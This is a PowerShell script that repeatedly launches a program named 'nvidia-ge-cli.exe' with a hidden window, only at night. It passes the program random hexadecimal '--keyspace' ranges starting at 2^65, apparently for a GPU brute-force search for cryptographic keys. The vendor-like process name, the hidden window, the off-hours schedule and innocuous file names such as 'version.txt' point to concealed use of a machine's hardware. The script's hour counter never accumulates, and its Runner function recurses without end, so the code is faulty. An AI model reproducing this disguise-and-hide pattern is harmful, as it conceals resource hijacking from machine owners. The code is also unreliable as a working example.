$startTime=(Get-Date)
$hoursRan=0
$goalRunHours=30
function Get-V{
    param(
        [Parameter(Mandatory = $true)]
        [BigInt]$start,
        [Parameter(Mandatory = $true)]
        [BigInt]$sections,
        [Parameter(Mandatory = $true)]
        [BigInt]$chunk
    )
    $shex = $start.tostring("x")
    $rand = Get-Random -Minimum 1 -Maximum $sections
    $end = $start + ($chunk * $rand)
    $ehex = $end.tostring("x")
    return "0x${shex}:0x${ehex}"
}

function Run-Finder {
    $range = Get-V 36893488147419103232 284667 64800000000000
    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
    if(!$process) {
        Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt" -WindowStyle Hidden
    }
}

function Stop-Finder {
    $hoursRan = $hoursRan+((Get-Date)-($startTime)).TotalHours
    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
    if($process) {
        Stop-Process -Force $process
    }
}

function Runner{
    $currTime=(Get-Date)
    if($currTime.hour -ge 21 -or $currTime.hour -le 7) {
        Run-Finder
    } else {
        Stop-Finder
    }
    if ($hoursRan -ge $goalRunHours) {
        Stop-Finder
        del state.txt
        $hoursRan=0
    }
    Start-Sleep -Seconds 900
    Runner
}

Runner
